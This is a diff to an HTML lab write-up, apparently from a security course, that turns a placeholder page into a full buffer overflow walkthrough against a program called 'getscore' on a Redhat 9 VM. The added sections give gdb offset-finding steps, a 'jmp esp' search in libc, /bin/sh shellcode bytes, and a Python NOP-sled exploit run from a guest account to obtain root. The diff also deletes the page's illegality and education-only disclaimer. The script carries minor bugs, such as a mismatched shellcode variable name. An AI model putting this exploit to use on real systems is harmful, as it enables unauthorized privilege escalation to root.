@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Buffer Overflow Attack Guide</title>
+    <title>Buffer Overflow Attack Report</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -44,11 +44,11 @@
 </head>
 <body>
     <div id="content">
-        <h1>Buffer Overflow Attack Guide</h1>
+        <h1>Buffer Overflow Attack Report</h1>
 
         <h2>Introduction</h2>
         <p>
-            This guide will help you understand and demonstrate a buffer overflow attack. Please note that buffer overflow attacks are illegal and unethical. This guide is for educational purposes only.
+            This guide will walk you through the process of setting up a virtual machine, gathering the necessary data for a buffer overflow attack, creating an exploit file in Python, and running the exploit.
         </p>
 
         <h2>Prerequisites</h2>
@@ -61,11 +61,11 @@
 
             <li><strong>Program and Files</strong>:
                 <p>
-                    You can download the <a href="https://drive.google.com/file/d/1-4L2V2m3grNeQNF7pvcin8qGZhh4cbrg/view">getscore.c</a>, <a href="https://drive.google.com/file/d/1-4L2V2m3grNeQNF7pvcin8qGZhh4cbrg/view">score.txt</a>, and Redhat9 VM from this link.
+                    You can download the getscore, score.txt, and Redhat9 VM from this <a href="https://drive.google.com/file/d/1-4L2V2m3grNeQNF7pvcin8qGZhh4cbrg/view">link</a>.
                 </p>
             </li>
 
-            <li><strong>Compile and Set Permissions</strong>:
+            <li><strong>Compile and Set the necssary Permissions</strong>:
                 <p>
                     Copy the <code>getscore.c</code> program to the VM or download it from <a href="http://analysis4ms.com/static/p1.zip">here</a>.
                 </p>
@@ -88,27 +88,120 @@
         </ol>
 
         <h2>Gathering Required Data</h2>
-        <!-- Content related to OFFSET, Return Address, and Shellcode sections -->
 
-        <h2>Creating the Exploit File in Python</h2>
-        <pre><code>
-            <!-- Your Python code here -->
-        </code></pre>
+<h3>1. OFFSET</h3>
+<p>
+    To determine the offset, you need to create a segmentation fault and examine the core dump using GDB.
+</p>
+
+<p><strong>Trigger a segmentation fault:</strong></p>
+<pre><code>./getscore aaa AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code></pre>
+
+<p><strong>Enable core dump in Redhat 9:</strong></p>
+<pre><code>ulimit -c unlimited</code></pre>
+
+<p><strong>Examine the core file with GDB:</strong></p>
+<pre><code>gdb -c core.xxxx</code></pre>
+
+<p><strong>Check the value of a register:</strong></p>
+<pre><code>info registers $esp</code></pre>
+
+<p><strong>Examine memory:</strong></p>
+<pre><code>x/100x $esp-200</code></pre>
+
+<p>
+    In your case, calculate the offset by subtracting the register's value (e.g., 0xbffff670) from the memory value (e.g., 0xbffff5e4). In my case the value yield for an <strong>offset value is 140</strong>.
+</p>
+
+<h3>2. Return Address</h3>
+<p>
+    To find the return address, you need to identify the "jmp esp" instruction.
+</p>
+
+<p>
+    <strong>Use the following command to get the lib</strong>
+</p>
+<pre><code>ldd getscore</code></pre>
+
+<p><strong>Write objdump results to a file:</strong></p>
+<p>In my case the lib is 'libc.so.6'</p>
+<pre><code>objdump -D /lib/tls/libc.so.6 > dis.txt</code></pre>
+
+<p><strong>Search for the "jmp esp" instruction:</strong></p>
+<pre><code>grep "jmp    *%esp" dis.txt</code></pre>
+
+<p>
+    You'll find a value like <code>0x12345678</code>, which you'll use in your Python exploit code.
+</p>
+
+<h3>3. Shellcode</h3>
+<p>Here's the shellcode to be used in your Python exploit:</p>
+<pre><code>shellcode = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";</code></pre>
+
+<h2>Creating the Exploit File in Python</h2>
+
+<p>Create an exploit file using vim or any text editor:</p>
+<pre>
+
+<code>import os</code>
+
+<code>import struct</code>
+
+# Set the return address
+
+<code>Address = struct.pack('&lt;L', 0x12345678)</code>  # Replace with your value
+
+# Set the shellcode
+
+<code>shellcode = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"</code>
+
+# Set the offset value
+
+<code>offset = 140 </code> # Replace with your calculated offset
+
+# Explanation for the offset value:
+
+# In your case, the initial offset might be calculated as 140.
+
+# However, you subtract 3 from it because you are going to add "aa " to the command, which is 3 characters.
+
+# So, the final offset used is 137.
+
+<code>offset = offset - 3</code>
+
+# Create the payload
+
+<code>Payload = ("\x90" * offset) + Address + ShellCode</code> # "/x90" corresponds to x86 assembly instruction NOP which is no operation
+
+# Define the command
+
+<code>Command = "./getscore aa " + Payload</code>
+
+# Execute the command
+
+<code>os.system(Command)</code>
+
+</pre>
+
+<p>Save and exit the file (in 'vim', press <strong>Esc</strong>, then type <strong>:w</strong> and <strong>:x</strong> to save and exit)</p>
+
+
 
         <h2>Running the Exploit</h2>
-        <ol>
-            <li><strong>Create a guest account</strong>:
+        <strong>Create a guest account</strong>:
                 <pre><code>useradd guest</code></pre>
-            </li>
-
-            <li><strong>Switch to the guest account</strong>:
+        <strong>Switch to the guest account</strong>:
                 <pre><code>su guest</code></pre>
-            </li>
-
-            <li><strong>Run the Python exploit</strong>:
+        <strong>Run the Python exploit</strong>:
                 <pre><code>python exploit.py</code></pre>
-            </li>
-        </ol>
+        
+        <p>The exploit code enables a transition from the guest user to the root user, marking the successful execution of our buffer overflow attack, resulting in gaining root access.</p>
+                
+        <strong>To confirm that our exploit works</strong>:
+                <pre><code>whoami</code></pre>
+        
+        <p>It should give back root</p>
+
 
         <h2>Common Error</h2>
         <p>
